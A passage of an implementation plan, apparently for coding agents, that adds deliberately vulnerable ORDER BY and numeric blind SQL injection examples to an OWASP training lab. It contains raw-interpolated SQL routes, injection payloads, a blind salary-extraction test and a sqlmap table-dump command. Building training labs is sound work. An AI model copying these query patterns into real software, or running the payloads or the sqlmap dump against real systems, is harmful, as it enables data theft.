# A03 SQLi Deepening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Deepen A03's SQL injection coverage with two new, purely additive examples (ORDER BY clause injection, and a multi-task boolean-blind numeric-context example requiring sqlmap for full extraction), plus a new reusable "multi-task with solutions" content pattern in the shared base template.

**Architecture:** Both new examples live on the existing `a03_bp` blueprint, registering in the EXISTING "SQL Injection" nav group (not a new group) at precise positions so the group's difficulty ordering stays valid. A new `Employee` model/table backs both examples with a richer, purpose-built dataset, kept completely separate from the existing `InjectionAccount` table (which an existing test hardcodes to exactly 2 rows). A new optional `{% block tasks %}` section is added to the shared `core/example_page_base.html`, generic and reusable — not SQLi-specific — for the still-to-come XSS and CMD-injection deepening sub-projects to reuse without modification.

**Tech Stack:** Flask, SQLAlchemy (`text()` raw SQL, matching the existing three SQLi examples' established pattern), Bootstrap 5 (native `collapse` component, already vendored), pytest. `sqlmap` is a verification tool used only in Task 3 — not a project dependency.

**Spec:** docs/superpowers/specs/2026-09-20-owasp-lab-a03-sqli-deepening-design.md

## Global Constraints

- No changes to any existing A01/A02/A04/existing-A03 route, model, template, seed data, or test. The three existing SQLi examples (`sqli-login`/`union-exfiltration`/`blind-sqli`) and the `InjectionAccount`/`Secret`/`Comment` models and their exact seed data are completely untouched.
- The vulnerable pattern in both new routes is exactly raw f-string interpolation via `db.session.execute(text(query))` — the identical pattern already used in `login()`, `search()`, and `check_username()` in `app/categories/a03_injection/routes.py`. This is not a new mechanism requiring fresh verification; it's the same well-proven technique applied to a new clause type and injection context.
- The new `{% block tasks %}` base-template addition is generic and reusable, not SQLi-specific — no SQL-specific logic or copy in the base template itself.
- **A real, previously-hit bug class in this project: never let a chosen boolean-oracle result string (e.g. "Found"/"Not found") also appear as literal text in an example's own static Explanation/Detect/Exploitation/Tasks prose.** Two prior sub-projects (SSTI, LDAP) both hit this exact collision — a regression test asserting on the live dynamic result string passed vacuously because the identical string also appeared, unconditionally, in the page's own static teaching content. This plan's template text (Task 2, Step 5) is written to avoid this proactively: the chosen result strings ("Employee record found." / "No employee with that ID matches.") are never quoted verbatim in any static prose block, only in the `live_example` block's dynamic output. Implementers must preserve this — do not add a sentence like `If the page shows "Employee record found." ...` anywhere in Explanation/Detect/Exploitation/Tasks.
- No new pip dependency. `requirements.txt` is not modified by this plan.
- No new docker-compose service. Both new routes use the existing `postgres` service via the existing `DATABASE_URL`.
- The exact `sqlmap` invocation that successfully dumps the full `a03_employees` table is confirmed live against the real Docker container in Task 3 — Task 2's template ships a well-reasoned best-effort invocation (with a documented fallback), and Task 3 is explicitly authorized to correct that template text if the documented command doesn't work as written against the real container (this is an in-scope correction for Task 3, not a deferred defect — see Task 3's own text).

---

### Task 1: Infrastructure + Medium — Employee Roster Sort (ORDER BY injection)

**Files:**
- Modify: `app/core/templates/core/example_page_base.html`
- Modify: `app/categories/a03_injection/models.py`
- Modify: `app/categories/a03_injection/seed.py`
- Modify: `app/categories/a03_injection/routes.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/templates/a03_injection/roster.html`
- Create: `tests/test_a03_roster.py`
- Modify: `tests/test_a03_overview.py`

**Interfaces:**
- Consumes: nothing new.
- Produces: the `Employee` model (table `a03_employees`, columns `id`/`name`/`email`/`department`/`salary`) and its 9 seeded rows; the `{% block tasks %}` base-template section (unused by this task's own example, but the interface Task 2 needs — verify it renders nothing when undefined, matching the existing `|trim` guard pattern used by `vulnerable_code`/`secure_code`); the `roster-sort` ExampleNav entry's position in `__init__.py` (inserted between `union-exfiltration` and `blind-sqli` — Task 2 inserts its own entry in a *different* position, after `blind-sqli`, so there's no positional dependency between the two tasks' nav edits, but both edit the same list and the same two `test_a03_overview.py` assertions, so Task 2's brief will show the post-Task-1 state of both as its starting point).

- [ ] **Step 1: Add the reusable Tasks block to the base template**

`app/core/templates/core/example_page_base.html` currently has this section (lines 19-36):

```html
{% if settings.show_exploit_instructions %}
{% set detect_content = self.detect() %}
{% if detect_content|trim %}
<section class="card mb-4">
  <div class="card-header">Detect</div>
  <div class="card-body">
    {% block detect %}{% endblock %}
  </div>
</section>
{% endif %}

<section class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white">Exploitation</div>
  <div class="card-body">
    {% block exploitation %}{% endblock %}
  </div>
</section>
{% endif %}
```

Change it to:

```html
{% if settings.show_exploit_instructions %}
{% set detect_content = self.detect() %}
{% if detect_content|trim %}
<section class="card mb-4">
  <div class="card-header">Detect</div>
  <div class="card-body">
    {% block detect %}{% endblock %}
  </div>
</section>
{% endif %}

<section class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white">Exploitation</div>
  <div class="card-body">
    {% block exploitation %}{% endblock %}
  </div>
</section>

{% set tasks_content = self.tasks() %}
{% if tasks_content|trim %}
<section class="card mb-4">
  <div class="card-header">Tasks</div>
  <div class="card-body">
    {% block tasks %}{% endblock %}
  </div>
</section>
{% endif %}
{% endif %}
```

This is the ONLY change to this file in this entire plan — it's a generic,
reusable addition (no SQLi-specific content), matching the existing
`vulnerable_code`/`secure_code` `|trim`-guard convention exactly. Examples
that don't define a `{% block tasks %}` (i.e. every existing example, and
this task's own new `roster.html`) render nothing extra — verified in
Step 9's regression test.

- [ ] **Step 2: Add the Employee model**

`app/categories/a03_injection/models.py` currently ends with the `Comment`
class. Append this new class at the end of the file:

```python


class Employee(db.Model):
    __tablename__ = "a03_employees"

    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    email = db.Column(db.String(120), nullable=False)
    department = db.Column(db.String(80), nullable=False)
    salary = db.Column(db.Integer, nullable=False)
```

- [ ] **Step 3: Seed the Employee data**

`app/categories/a03_injection/seed.py` currently reads:

```python
from app.categories.a03_injection.models import Comment, InjectionAccount, Secret
from app.extensions import db


def seed_injection_data():
    if InjectionAccount.query.count() == 0:
        db.session.add(InjectionAccount(username="alice", password="alice123", is_admin=False))
        db.session.add(
            InjectionAccount(username="admin", password="sup3r-s3cret-admin-pw", is_admin=True)
        )
        db.session.commit()
    if Secret.query.count() == 0:
        db.session.add(Secret(label="Internal API Key", value="sk_live_51NxFakeKeyForTraining000"))
        db.session.add(
            Secret(label="Database Backup Location", value="s3://internal-backups/prod-db-2024.sql.gz")
        )
        db.session.commit()
    if Comment.query.count() == 0:
        db.session.add(Comment(author="Guest", body="Nice site, looking forward to more posts!"))
        db.session.commit()
```

Change it to:

```python
from app.categories.a03_injection.models import Comment, Employee, InjectionAccount, Secret
from app.extensions import db


def seed_injection_data():
    if InjectionAccount.query.count() == 0:
        db.session.add(InjectionAccount(username="alice", password="alice123", is_admin=False))
        db.session.add(
            InjectionAccount(username="admin", password="sup3r-s3cret-admin-pw", is_admin=True)
        )
        db.session.commit()
    if Secret.query.count() == 0:
        db.session.add(Secret(label="Internal API Key", value="sk_live_51NxFakeKeyForTraining000"))
        db.session.add(
            Secret(label="Database Backup Location", value="s3://internal-backups/prod-db-2024.sql.gz")
        )
        db.session.commit()
    if Comment.query.count() == 0:
        db.session.add(Comment(author="Guest", body="Nice site, looking forward to more posts!"))
        db.session.commit()
    if Employee.query.count() == 0:
        db.session.add_all(
            [
                Employee(
                    name="Alice Chen",
                    email="alice.chen@owasp-lab.internal",
                    department="Engineering",
                    salary=95000,
                ),
                Employee(
                    name="Bob Martinez",
                    email="bob.martinez@owasp-lab.internal",
                    department="Engineering",
                    salary=98000,
                ),
                Employee(
                    name="Carol Nguyen",
                    email="carol.nguyen@owasp-lab.internal",
                    department="Engineering",
                    salary=102000,
                ),
                Employee(
                    name="David Okafor",
                    email="david.okafor@owasp-lab.internal",
                    department="Finance",
                    salary=88000,
                ),
                Employee(
                    name="Elena Petrova",
                    email="elena.petrova@owasp-lab.internal",
                    department="Finance",
                    salary=91000,
                ),
                Employee(
                    name="Frank Lopez",
                    email="frank.lopez@owasp-lab.internal",
                    department="Support",
                    salary=62000,
                ),
                Employee(
                    name="Grace Kim",
                    email="grace.kim@owasp-lab.internal",
                    department="Support",
                    salary=65000,
                ),
                Employee(
                    name="Henry Osei",
                    email="henry.osei@owasp-lab.internal",
                    department="Support",
                    salary=60000,
                ),
                Employee(
                    name="Morgan Reyes",
                    email="morgan.reyes@owasp-lab.internal",
                    department="Executive",
                    salary=285000,
                ),
            ]
        )
        db.session.commit()
```

Note: rows are inserted in this exact order, so with a fresh auto-increment
primary key, Morgan Reyes (the last row added) gets `id=9`. Task 2's route
and tests rely on Morgan Reyes being `id=9` — this ordering must be
preserved exactly.

- [ ] **Step 4: Write the failing tests**

Create `tests/test_a03_roster.py`:

```python
from sqlalchemy.exc import DBAPIError


def test_roster_default_view_lists_all_employees(client):
    response = client.get("/a03/roster")
    assert response.status_code == 200
    assert b"Alice Chen" in response.data
    assert b"Morgan Reyes" in response.data


def test_roster_column_count_discovery_via_order_by_position(app, client):
    # A valid ordinal position (4 columns are selected: id, name, email,
    # department) succeeds.
    valid = client.get("/a03/roster", query_string={"sort": "4"})
    assert valid.status_code == 200

    # An out-of-range ordinal position (5) genuinely raises a real database
    # error -- this is the discriminating signal that confirms the exact
    # column count without ever seeing any row data. Under Flask's TESTING
    # config, this exception propagates to the test client caller directly
    # (verified: TESTING=True disables Flask's default exception-to-500
    # conversion) rather than becoming a 500 response -- so the test
    # asserts on the raised exception, not a response object. Live in
    # Docker (non-debug, non-testing), this same underlying error instead
    # surfaces as Flask's generic 500 error page, an equally real and
    # observable signal to a trainee using a browser.
    with app.app_context():
        try:
            client.get("/a03/roster", query_string={"sort": "5"})
            raised = False
        except DBAPIError:
            raised = True
    assert raised


def test_roster_boolean_reordering_via_case_when(client):
    # A CASE WHEN expression that's numerically comparable across both
    # branches (id vs. -id) reorders rows based on a condition, without any
    # error and without revealing anything the app doesn't already show --
    # purely a boolean signal encoded in row order.
    true_condition = client.get(
        "/a03/roster", query_string={"sort": "(CASE WHEN (1=1) THEN id ELSE id * -1 END)"}
    )
    assert true_condition.status_code == 200
    false_condition = client.get(
        "/a03/roster", query_string={"sort": "(CASE WHEN (1=2) THEN id ELSE id * -1 END)"}
    )
    assert false_condition.status_code == 200
    # True condition sorts ascending by id (Alice Chen, id=1, appears
    # before Morgan Reyes, id=9); false condition sorts by -id, reversing
    # that order. Comparing the two responses' relative position of these
    # two names proves the boolean signal is genuinely observable via
    # row order alone.
    true_body = true_condition.data.decode()
    false_body = false_condition.data.decode()
    assert true_body.index("Alice Chen") < true_body.index("Morgan Reyes")
    assert false_body.index("Morgan Reyes") < false_body.index("Alice Chen")


def test_roster_secure_pattern_rejects_injection_attempt():
    # Proves the Vulnerable-vs-Secure panel's allowlist approach genuinely
    # neutralizes an injection attempt -- a malicious sort expression is
    # not a member of the allowed column-name set, so it's replaced with
    # the safe default before ever reaching string interpolation.
    allowed_sort_columns = {"id", "name", "email", "department"}
    malicious_sort = "(CASE WHEN (1=1) THEN id ELSE id * -1 END)"
    safe_sort = malicious_sort if malicious_sort in allowed_sort_columns else "id"
    assert safe_sort == "id"


def test_roster_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.get("/a03/roster")
    assert response.status_code == 200
    assert b"Alice Chen" in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data


def test_roster_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Employee Roster Sort" in response.data
    assert b'href="/a03/roster"' in response.data


def test_tasks_block_does_not_render_for_examples_without_it(client):
    # Confirms the new |trim-guarded Tasks section (Step 1) doesn't
    # accidentally render an empty card on any example that doesn't
    # define {% block tasks %} -- checked against this task's own new
    # roster.html AND an existing, unrelated example page, proving the
    # guard is safe project-wide, not just for this one template.
    roster_response = client.get("/a03/roster")
    assert b'<div class="card-header">Tasks</div>' not in roster_response.data

    existing_response = client.get("/a03/login")
    assert b'<div class="card-header">Tasks</div>' not in existing_response.data
```

- [ ] **Step 5: Run tests to verify they fail**

Run: `pytest tests/test_a03_roster.py -v`
Expected: all FAIL — the route doesn't exist yet (404s), and the model/table don't exist yet either.

- [ ] **Step 6: Add the route**

In `app/categories/a03_injection/routes.py`, the current top of the file reads:

```python
import os
import subprocess
import urllib.request

from flask import redirect, render_template, render_template_string, request, session, url_for
from ldap3 import SUBTREE
from lxml import etree
from sqlalchemy import text

from app.categories.a03_injection import a03_bp, ldap_client
from app.categories.a03_injection.models import Comment, InjectionAccount
from app.extensions import db
```

Change the models import line to add `Employee`:

```python
import os
import subprocess
import urllib.request

from flask import redirect, render_template, render_template_string, request, session, url_for
from ldap3 import SUBTREE
from lxml import etree
from sqlalchemy import text

from app.categories.a03_injection import a03_bp, ldap_client
from app.categories.a03_injection.models import Comment, Employee, InjectionAccount
from app.extensions import db
```

Then append this route at the end of the file (after the existing
`directory_search()` route):

```python


@a03_bp.route("/roster")
def roster():
    sort = request.args.get("sort", "id")
    # VULNERABLE: raw string-concatenated SQL in the ORDER BY clause, no
    # parameterization -- ORDER BY targets are identifiers/expressions, not
    # literal values, so bound parameters (which only substitute literal
    # values) can't protect this clause the way they protect a WHERE clause.
    query = f"SELECT id, name, email, department FROM a03_employees ORDER BY {sort}"
    results = db.session.execute(text(query)).all()
    return render_template("a03_injection/roster.html", sort=sort, results=results)
```

- [ ] **Step 7: Register the nav entry**

In `app/categories/a03_injection/__init__.py`, the `examples=[...]` list
currently reads (relevant excerpt):

```python
            ExampleNav(
                id="union-exfiltration",
                title="UNION-Based SQL Injection Data Exfiltration",
                group="SQL Injection",
                difficulty="Medium",
                endpoint="a03_injection.search",
            ),
            ExampleNav(
                id="blind-sqli",
                title="Blind Time-Based SQL Injection",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.check_username",
            ),
```

Insert a new entry BETWEEN `union-exfiltration` and `blind-sqli` (this
exact position matters — it keeps the "SQL Injection" group's difficulty
sequence Easy→Medium→Medium→Hard, satisfying
`test_a03_examples_grouped_by_vulnerability_subtype`'s existing
"group examples must be Easy-to-Hard" sortedness check; see Step 8):

```python
            ExampleNav(
                id="union-exfiltration",
                title="UNION-Based SQL Injection Data Exfiltration",
                group="SQL Injection",
                difficulty="Medium",
                endpoint="a03_injection.search",
            ),
            ExampleNav(
                id="roster-sort",
                title="Employee Roster Sort (ORDER BY Injection)",
                group="SQL Injection",
                difficulty="Medium",
                endpoint="a03_injection.roster",
            ),
            ExampleNav(
                id="blind-sqli",
                title="Blind Time-Based SQL Injection",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.check_username",
            ),
```

- [ ] **Step 8: Update the hardcoded nav-list tests**

Inserting `roster-sort` in the MIDDLE of the flat examples list (not
appended at the end, unlike every prior A03 sub-project) shifts the
positions of every entry after it in the flat difficulty list, and adds
one member to the "SQL Injection" group's list. Open
`tests/test_a03_overview.py` and make these two changes precisely:

In `test_a03_registered_in_nav`, the current list (14... wait, 12 entries,
reflecting the state after the just-merged LDAP sub-project) reads:

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
    ]
```

Change it to (the new `"Medium"` is inserted at index 2, i.e. the 3rd
entry, immediately after the existing `union-exfiltration`'s `"Medium"`
and before `blind-sqli`'s `"Hard"` — matching exactly where the
`ExampleNav` was inserted in Step 7):

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Medium",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
    ]
```

In `test_a03_examples_grouped_by_vulnerability_subtype`, the current
assertion for the SQL Injection group reads:

```python
    assert [e.id for e in grouped[0][1]] == ["sqli-login", "union-exfiltration", "blind-sqli"]
```

Change it to:

```python
    assert [e.id for e in grouped[0][1]] == [
        "sqli-login",
        "union-exfiltration",
        "roster-sort",
        "blind-sqli",
    ]
```

(No other line in either test changes — the group *names* list, and every
other group's member list, are untouched by this task.)

- [ ] **Step 9: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/roster.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Employee Roster Sort (ORDER BY Injection)" %}
{% set example_difficulty = "Medium" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "sort the employee roster" feature lets you pick which column to
  sort by, and builds the query's <code>ORDER BY</code> clause directly
  from your input with no validation:
  <code>SELECT id, name, email, department FROM a03_employees ORDER BY
  {{ '{sort}' }}</code>. Every other SQL injection example in this lab
  injects into a <code>WHERE</code> clause; this one is different — an
  <code>ORDER BY</code> target is a column reference or expression, not a
  literal value, so the usual fix (bound parameters, which only
  substitute literal values into a query) doesn't apply here at all. The
  real-world fix for this specific clause type is different too — see
  Vulnerable vs. Secure below.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit an out-of-range column position as the sort target, e.g.
  <code>sort=99</code>. The roster only selects 4 columns, so
  <code>ORDER BY 99</code> is invalid — a properly parameterized query
  couldn't be tricked into treating your input as a raw ordinal position
  at all, but this one throws a real database error, confirming your
  input reaches the <code>ORDER BY</code> clause unescaped.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Try <code>sort=4</code> — the roster still loads normally (4 is a
      valid column position; the table selects exactly 4 columns).</li>
  <li>Try <code>sort=5</code> — the request fails with a database error.
      That single comparison confirms the exact column count (4) without
      ever seeing a row of data — the same "binary search the column
      count" technique attackers use before pivoting an ORDER BY
      injection into a full UNION-based extraction.</li>
  <li>Once you don't even want to trigger visible errors, you can extract
      a boolean signal purely through row order. Try:
      <code>sort=(CASE WHEN (1=1) THEN id ELSE id * -1 END)</code> — the
      roster sorts normally (ascending by ID). Now try:
      <code>sort=(CASE WHEN (1=2) THEN id ELSE id * -1 END)</code> — the
      entire order reverses. Swap <code>1=1</code>/<code>1=2</code> for
      any real condition (e.g. a subquery testing a specific employee's
      salary) and the row order itself becomes a true/false oracle,
      leaking one bit per request with zero errors and zero extra data
      shown.</li>
</ol>
<p>
  ORDER BY injection rarely gets its own headline the way UNION or
  authentication-bypass injection do, but it shows up constantly in
  real applications with sortable tables, reports, and admin grids — and
  it's a favorite reconnaissance step precisely because it's silent: no
  error, no extra column, just a reordering an attacker controls. Column
  counts and type information learned this way are exactly what's needed
  to craft a working UNION-based payload against the very same query.
</p>
{% endblock %}

{% block vulnerable_code %}query = f"SELECT id, name, email, department FROM a03_employees ORDER BY {sort}"
results = db.session.execute(text(query)).all()
{% endblock %}

{% block secure_code %}# Bound parameters can't protect an ORDER BY target (it's not a literal
# value) -- allowlist the permitted column names instead.
ALLOWED_SORT_COLUMNS = {"id", "name", "email", "department"}
safe_sort = sort if sort in ALLOWED_SORT_COLUMNS else "id"
query = f"SELECT id, name, email, department FROM a03_employees ORDER BY {safe_sort}"
results = db.session.execute(text(query)).all()
{% endblock %}

{% block live_example %}
<form method="get" class="mb-3">
  <div class="input-group">
    <input type="text" class="form-control" name="sort" value="{{ sort }}" placeholder="id">
    <button type="submit" class="btn btn-primary">Sort</button>
  </div>
</form>
<table class="table table-striped">
  <thead>
    <tr><th>ID</th><th>Name</th><th>Email</th><th>Department</th></tr>
  </thead>
  <tbody>
    {% for row in results %}
    <tr><td>{{ row.id }}</td><td>{{ row.name }}</td><td>{{ row.email }}</td><td>{{ row.department }}</td></tr>
    {% endfor %}
  </tbody>
</table>
{% endblock %}
```

Note the `{{ '{sort}' }}` in the Explanation block: this is a literal,
plain-text display of the placeholder text `{sort}` for illustration —
NOT an f-string being evaluated (it's inside a Jinja string literal,
producing the literal 4 characters `{sort}` in the rendered page). This
is unrelated to the SSTI sub-project's `{% raw %}` concern (that was
about literal *Jinja* `{{ }}` syntax being accidentally evaluated by
*this app's own* Jinja renderer) — here there is no Jinja syntax in the
source text at all, just an ordinary Python-style placeholder shown as
plain prose, so no escaping mechanism is needed. Do not wrap it in
`{% raw %}` — that would change nothing here and isn't the applicable
pattern.

- [ ] **Step 10: Run the tests to verify they pass**

Run: `pytest tests/test_a03_roster.py -v`
Expected: all 7 PASS.

- [ ] **Step 11: Run the full suite**

Run: `pytest tests/ -v`
Expected: all PASS (196 existing + 7 new = 203)

- [ ] **Step 12: Commit**

```bash
git add app/core/templates/core/example_page_base.html \
  app/categories/a03_injection/models.py app/categories/a03_injection/seed.py \
  app/categories/a03_injection/routes.py app/categories/a03_injection/__init__.py \
  app/categories/a03_injection/templates/a03_injection/roster.html \
  tests/test_a03_roster.py tests/test_a03_overview.py
git commit -m "feat: add reusable Tasks pattern and A03 ORDER BY injection example (Medium)"
```

---

### Task 2: Hard — Employee Lookup (numeric boolean-blind, multi-task, sqlmap)

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/templates/a03_injection/roster_lookup.html`
- Create: `tests/test_a03_roster_lookup.py`
- Modify: `tests/test_a03_overview.py`

**Interfaces:**
- Consumes: the `Employee` model and its 9 seeded rows (Morgan Reyes at
  `id=9`, salary `285000` — Task 1); the `{% block tasks %}` base-template
  section (Task 1, first real usage).
- Produces: nothing consumed by later tasks — this is the last functional
  change in this plan.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_a03_roster_lookup.py`:

```python
def test_roster_lookup_confirms_existing_employee(client):
    response = client.get("/a03/roster-lookup", query_string={"id": "9"})
    assert response.status_code == 200
    assert b"Employee record found." in response.data


def test_roster_lookup_reports_no_match_for_nonexistent_id(client):
    response = client.get("/a03/roster-lookup", query_string={"id": "9999"})
    assert response.status_code == 200
    assert b"No employee with that ID matches." in response.data


def test_roster_lookup_boolean_probe_discriminates_true_false(client):
    always_true = client.get("/a03/roster-lookup", query_string={"id": "1 OR 1=1"})
    assert always_true.status_code == 200
    assert b"Employee record found." in always_true.data

    always_false = client.get("/a03/roster-lookup", query_string={"id": "1 AND 1=2"})
    assert always_false.status_code == 200
    assert b"No employee with that ID matches." in always_false.data


def test_roster_lookup_blind_extraction_recovers_target_salary(client):
    # Binary-search Morgan Reyes' (id=9) exact salary using ONLY the
    # boolean found/not-found oracle -- proving the entire route genuinely
    # leaks numeric data one comparison at a time, the same "prove it for
    # real, through the actual HTTP-level route, not a shortcut" discipline
    # used for the LDAP sub-project's blind extraction test.
    low, high = 0, 1000000
    while low < high:
        mid = (low + high) // 2
        payload = f"9 AND (SELECT salary FROM a03_employees WHERE id=9) > {mid}"
        response = client.get("/a03/roster-lookup", query_string={"id": payload})
        found = b"Employee record found." in response.data
        if found:
            low = mid + 1
        else:
            high = mid
    assert low == 285000


def test_roster_lookup_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.get("/a03/roster-lookup", query_string={"id": "9"})
    assert response.status_code == 200
    assert b"Employee record found." in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data
    assert b"Tasks" not in response.data


def test_roster_lookup_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Employee Lookup" in response.data
    assert b'href="/a03/roster-lookup"' in response.data
```

Note: `test_roster_lookup_blind_extraction_recovers_target_salary` takes
roughly 20 requests (binary search over a 0-1,000,000 range) — this
directly demonstrates why Task 3 (extracting the ENTIRE table this way)
is genuinely impractical by hand: one numeric column, one target row,
binary search is ~20 requests; the full table (9 rows × salary, plus 3
string columns per row needing per-character extraction) is orders of
magnitude more, which is exactly the honest justification for the
sqlmap-required framing.

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_a03_roster_lookup.py -v`
Expected: all FAIL — the route doesn't exist yet (404s).

- [ ] **Step 3: Add the route**

In `app/categories/a03_injection/routes.py`, append this route at the end
of the file (after the `roster()` route added in Task 1):

```python


@a03_bp.route("/roster-lookup")
def roster_lookup():
    emp_id = request.args.get("id", "")
    found = None
    if emp_id:
        # VULNERABLE: raw string-concatenated SQL in a NUMERIC context, no
        # parameterization -- unlike every other SQLi example in this lab,
        # there's no string literal to break out of here at all; the input
        # is substituted directly as a bare numeric/expression token.
        query = f"SELECT COUNT(*) FROM a03_employees WHERE id = {emp_id}"
        count = db.session.execute(text(query)).scalar()
        found = bool(count)
    return render_template("a03_injection/roster_lookup.html", emp_id=emp_id, found=found)
```

- [ ] **Step 4: Register the nav entry**

In `app/categories/a03_injection/__init__.py`, the `examples=[...]` list
now reads (relevant excerpt, after Task 1's insertion):

```python
            ExampleNav(
                id="blind-sqli",
                title="Blind Time-Based SQL Injection",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.check_username",
            ),
            ExampleNav(
                id="reflected-xss",
                title="Reflected XSS in Greeting Page",
                group="Cross-Site Scripting (XSS)",
                difficulty="Medium",
                endpoint="a03_injection.greet",
            ),
```

Insert a new entry BETWEEN `blind-sqli` and `reflected-xss` (this exact
position places the new flagship example last within the "SQL Injection"
group's member list — after both existing Hard example `blind-sqli` and
the new `roster-sort`/Medium from Task 1 — while keeping the group's
difficulty sequence Easy→Medium→Medium→Hard→Hard, still satisfying the
sortedness check):

```python
            ExampleNav(
                id="blind-sqli",
                title="Blind Time-Based SQL Injection",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.check_username",
            ),
            ExampleNav(
                id="roster-lookup",
                title="Employee Lookup (Numeric Blind Injection)",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.roster_lookup",
            ),
            ExampleNav(
                id="reflected-xss",
                title="Reflected XSS in Greeting Page",
                group="Cross-Site Scripting (XSS)",
                difficulty="Medium",
                endpoint="a03_injection.greet",
            ),
```

- [ ] **Step 5: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/roster_lookup.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Employee Lookup (Numeric Blind Injection)" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "look up an employee by ID" feature builds its query directly from
  your input with no parameterization:
  <code>SELECT COUNT(*) FROM a03_employees WHERE id = {{ '{id}' }}</code>.
  Every other SQL injection example in this lab injects into a
  <em>string</em> literal (something wrapped in quotes you have to break
  out of); this one is different — <code>id</code> is a bare numeric
  token with no quotes around it at all, so there's nothing to escape
  out of. Whatever you submit becomes part of the SQL expression
  directly. The page tells you only whether a matching record exists —
  never any of its actual data — making this a <strong>blind</strong>
  injection point: useful data only comes out one true/false bit at a
  time.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit <code>1 OR 1=1</code> as the ID, then separately submit
  <code>1 AND 1=2</code>. The first should confirm a match; the second
  should confirm no match — even though neither is a real employee ID.
  That contrast is only possible if your input reaches the query as raw
  SQL rather than a validated integer.
</p>
{% endblock %}

{% block exploitation %}
<p>
  Once you've confirmed the injection with the Detect probes above, you
  can turn the same true/false signal into a way to read data you're
  never shown directly — see the Tasks below, which walk through this
  step by step, from a single manual probe to full automated extraction.
</p>
{% endblock %}

{% block tasks %}
<ol class="list-unstyled">
  <li class="mb-4">
    <strong>Task 1: Confirm the injection with a single boolean probe.</strong>
    <p>Submit an ID value that should always match, and one that never
    should, and confirm the page's response genuinely differs.</p>
    <button class="btn btn-sm btn-outline-secondary" type="button"
            data-bs-toggle="collapse" data-bs-target="#task1-solution">
      Show solution
    </button>
    <div class="collapse mt-2" id="task1-solution">
      <div class="card card-body">
        <p>Submit <code>1 OR 1=1</code> — the query becomes
        <code>WHERE id = 1 OR 1=1</code>, always true, matching every row.
        Submit <code>1 AND 1=2</code> — always false, matching nothing.
        The page's response genuinely differs between the two, proving
        you control the query's logic, not just the ID being searched
        for.</p>
      </div>
    </div>
  </li>
  <li class="mb-4">
    <strong>Task 2: Extract one specific value by hand — Morgan Reyes'
    (employee ID 9) exact salary — using only the boolean signal.</strong>
    <p>You can't see any data directly, but you can ask yes/no questions
    about it and binary-search your way to the exact number.</p>
    <button class="btn btn-sm btn-outline-secondary" type="button"
            data-bs-toggle="collapse" data-bs-target="#task2-solution">
      Show solution
    </button>
    <div class="collapse mt-2" id="task2-solution">
      <div class="card card-body">
        <p>Submit IDs shaped like
        <code>9 AND (SELECT salary FROM a03_employees WHERE id=9) &gt; 500000</code>
        — if it matches, the salary is above 500,000; if not, it's below.
        Halve the range each time (try 250000, then 125000 or 375000, and
        so on) and within about 20 requests you'll pin down the exact
        value: <strong>285000</strong>.</p>
      </div>
    </div>
  </li>
  <li class="mb-4">
    <strong>Task 3: Extract the entire employee roster — every row, every
    column. This one genuinely requires automated tooling.</strong>
    <p>Task 2 took about 20 requests for ONE number. The full roster is 9
    rows across 4 more columns (name, email, department, salary), and the
    text columns need per-character extraction, not just one binary
    search. Doing this by hand would take an impractically large number
    of requests — which is exactly why tools like <code>sqlmap</code>
    exist: point it at the injection point and let it enumerate the
    entire table unattended.</p>
    <button class="btn btn-sm btn-outline-secondary" type="button"
            data-bs-toggle="collapse" data-bs-target="#task3-solution">
      Show solution
    </button>
    <div class="collapse mt-2" id="task3-solution">
      <div class="card card-body">
        <p>From a shell with <code>sqlmap</code> installed:</p>
        <pre><code class="language-python">sqlmap -u "http://127.0.0.1:5001/a03/roster-lookup?id=1" \
  --batch --technique=B --level=1 --risk=1 \
  -D owasp_lab -T a03_employees --dump</code></pre>
        <p>If automatic column enumeration doesn't succeed, provide the
        column names explicitly:</p>
